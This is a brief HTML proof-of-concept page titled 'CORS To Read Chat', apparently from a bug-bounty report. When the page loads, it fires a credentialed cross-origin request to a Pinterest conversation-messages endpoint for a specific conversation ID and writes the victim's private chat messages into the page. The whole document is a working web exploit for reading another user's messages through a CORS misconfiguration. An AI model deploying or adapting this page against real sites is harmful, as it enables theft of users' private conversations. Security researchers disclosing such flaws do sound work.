<html>
<head>
<title>HELLO</title>
</head>
<body onload = "cors()">
<h2>CORS To Read Chat</h2>
<div id="demo">
</div>
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = document.write(this.responseText);
    }
  };
  xhttp.open("GET", "https://pinterest.com/resource/ConversationMessagesResource/get/?source_url=%2F&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22page_size%22%3A25%2C%22conversation_id%22%3A%225110266791605608593%22%7D%2C%22context%22%3A%7B%7D%7D&_=1599200934652", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
</body>
</html>
